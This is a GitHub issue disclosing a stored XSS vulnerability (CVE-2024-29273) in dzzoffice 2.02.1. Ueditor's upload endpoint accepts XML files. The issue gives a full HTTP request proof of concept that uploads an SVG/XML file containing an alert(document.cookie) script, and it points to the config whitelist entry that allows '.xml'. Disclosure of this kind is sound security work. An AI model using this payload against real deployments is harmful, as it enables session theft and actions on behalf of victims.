
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzyx0814%2Fdzzoffice%2Fissues%2F244)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzyx0814%2Fdzzoffice%2Fissues%2F244)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=zyx0814%2Fdzzoffice)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zyx0814](/zyx0814)
/
**[dzzoffice](/zyx0814/dzzoffice)**
Public

* [Notifications](/login?return_to=%2Fzyx0814%2Fdzzoffice) You must be signed in to change notification settings
* [Fork
  808](/login?return_to=%2Fzyx0814%2Fdzzoffice)
* [Star
   3.9k](/login?return_to=%2Fzyx0814%2Fdzzoffice)

* [Code](/zyx0814/dzzoffice)
* [Issues
  199](/zyx0814/dzzoffice/issues)
* [Pull requests
  9](/zyx0814/dzzoffice/pulls)
* [Actions](/zyx0814/dzzoffice/actions)
* [Projects
  0](/zyx0814/dzzoffice/projects)
* [Wiki](/zyx0814/dzzoffice/wiki)
* [Security](/zyx0814/dzzoffice/security)
* [Insights](/zyx0814/dzzoffice/pulse)

Additional navigation options

* [Code](/zyx0814/dzzoffice)
* [Issues](/zyx0814/dzzoffice/issues)
* [Pull requests](/zyx0814/dzzoffice/pulls)
* [Actions](/zyx0814/dzzoffice/actions)
* [Projects](/zyx0814/dzzoffice/projects)
* [Wiki](/zyx0814/dzzoffice/wiki)
* [Security](/zyx0814/dzzoffice/security)
* [Insights](/zyx0814/dzzoffice/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fzyx0814%2Fdzzoffice%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fzyx0814%2Fdzzoffice%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Stored XSS Vulnerability in dzzoffice 2.02.1 SC UTF8 Due to Ueditor's Uploadfile Method #244

Open

[Hebing123](/Hebing123) opened this issue
Mar 11, 2024
· 2 comments

Open

# [Stored XSS Vulnerability in dzzoffice 2.02.1 SC UTF8 Due to Ueditor's Uploadfile Method](#top) #244

[Hebing123](/Hebing123) opened this issue
Mar 11, 2024
· 2 comments

## Comments

[![@Hebing123](https://avatars.githubusercontent.com/u/66168888?s=80&u=2ec1cd22761ddb03446a2f488bb0898afc30f0d8&v=4)](/Hebing123)

Copy link

### **[Hebing123](/Hebing123)** commented [Mar 11, 2024](#issue-2178297894) • edited Loading

| **Summary** There is a significant Stored Cross-Site Scripting (XSS) vulnerability identified in dzzoffice 2.02.1 SC UTF8. This vulnerability allows the upload of XML files through Ueditor's uploadfile method, leading to the possibility of an XSS exploit. The potential for harm is elevated as the malicious scripts are permanently stored on the server and executed whenever the user accesses the saved file. **Detail** The vulnerability exists due to the application's failure to properly sanitize the XML files being uploaded via the uploadfile method of Ueditor. A possible exploitation would involve the unauthorized uploading of an XML file embedded with a malicious script. In this case, the XML file contains a JavaScript script that, when run, shows the user's cookies. **POC** ``` POST /index.php?mod=attach&op=controller&action=uploadfile HTTP/1.1 Host: 192.168.160.147:8787 Content-Length: 563 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.160.147:8787 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXifIXP0SoqrCZIbo User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.289 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Cookie:  Hmcz_2132_saltkey=udCaCtcc; Hmcz_2132_lastvisit=1710124655; Hmcz_2132_ulastactivity=c6a8N3U0dWA9gtpEK0bssjGSNkUV6J6j8JD4d5wderSfZMkI6s_P; Hmcz_2132_auth=bd19HGU2qM6RDikVsboyLG0RFWtF0mQx0B0i2a8hGy4-P_Bmk-ITz4Kr8hXlSsNfli-Cid5WguEwml4QSLJD; Hmcz_2132_checkupgrade=1; Hmcz_2132_viewid=tid_1; Hmcz_2132_checkappupgrade=1; Hmcz_2132_sid=iIedFD; Hmcz_2132_news_index_isshow=show; Hmcz_2132_forum_lastvisit=D_index_1710135494D_1_1710135495; Hmcz_2132_lastact=1710135618%09index.php%09attach Connection: close  ------WebKitFormBoundaryXifIXP0SoqrCZIbo Content-Disposition: form-data; name="upfile"; filename="20c5297f-deaf-43e2-84ff-94e262f28087.xml" Content-Type: text/xml  <?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"> <polygon points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/> <script type="text/javascript"> alert(document.cookie); </script> </svg> ------WebKitFormBoundaryXifIXP0SoqrCZIbo--   ```  We get in the return package (attachment parameters) in the file path DZZ/202403/11/135705v2thuiv96iyi5svx.xml  Url: <http://192.168.160.147:8787/data/attachment/dzz/202403/11/135705v2thuiv96iyi5svx.xml>  [image](https://private-user-images.githubusercontent.com/66168888/311600595-e7f90b92-cfd3-448b-8284-3c2743dbbf54.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjY1NzQsIm5iZiI6MTczNjUyNjI3NCwicGF0aCI6Ii82NjE2ODg4OC8zMTE2MDA1OTUtZTdmOTBiOTItY2ZkMy00NDhiLTgyODQtM2MyNzQzZGJiZjU0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MjQzNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTczYjA4Y2E5MjlmYzNlNDI5MjE4NGMyZTVjMjg1YzFmZTY0NDNhYmI4MzlhN2M0MjUyNWRjZTM1MGY1NzFmNGImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.oVdGlP4Fb50xNUTk9TgmydWOBUf4YWvek9K787VOfkQ) **Impact** The impact of this vulnerability is substantial. Stored XSS attacks are potentially more devastating than other types as they can compromise a larger portion of users. Since the malicious script is stored on the server, every user who accesses the file would be a victim of the XSS attack. In our case, the script displayed the user's cookies. However, a malicious attacker may design more harmful scripts to, for example, steal session cookies, perform actions on behalf of the user, or even carry out phishing attacks. This vulnerability poses a serious security threat, and immediate remedial measures are recommended. |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@Hebing123](https://avatars.githubusercontent.com/u/66168888?s=80&u=2ec1cd22761ddb03446a2f488bb0898afc30f0d8&v=4)](/Hebing123)

Copy link

Author

### **[Hebing123](/Hebing123)** commented [May 10, 2024](#issuecomment-2104288864)

| This is the vulnerability exploitation reference for [CVE-2024-29273](https://github.com/advisories/GHSA-35j4-3hfm-6mj2 "CVE-2024-29273") |
| --- |

All reactions

Sorry, something went wrong.

[![@Hebing123](https://avatars.githubusercontent.com/u/66168888?s=80&u=2ec1cd22761ddb03446a2f488bb0898afc30f0d8&v=4)](/Hebing123)

Copy link

Author

### **[Hebing123](/Hebing123)** commented [Jul 1, 2024](#issuecomment-2199080660) • edited Loading

| Hello, I see in `ueditor/php/config.js` that you did not delete the upload whitelist of `.xml` file, thus causing this vulnerability, not a false positive.   [dzzoffice/dzz/system/ueditor/php/config.json](https://github.com/zyx0814/dzzoffice/blob/d8a10dc79b886712ba22a97f4224706be886e725/dzz/system/ueditor/php/config.json#L65-L70)  Lines 65 to 70 in [d8a10dc](/zyx0814/dzzoffice/commit/d8a10dc79b886712ba22a97f4224706be886e725)   |  | "fileAllowFiles": [ | | --- | --- | |  | ".png", ".jpg", ".jpeg", ".gif", ".bmp", | |  | ".flv", ".swf", ".mkv", ".avi", ".rm", ".rmvb", ".mpeg", ".mpg", | |  | ".ogg", ".ogv", ".mov", ".wmv", ".mp4", ".webm", ".mp3", ".wav", ".mid", | |  | ".rar", ".zip", ".tar", ".gz", ".7z", ".bz2", ".cab", ".iso", | |  | ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".md", ".xml" | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fzyx0814%2Fdzzoffice%2Fissues%2F244)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

1 participant

[![@Hebing123](https://avatars.githubusercontent.com/u/66168888?s=52&v=4)](/Hebing123)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

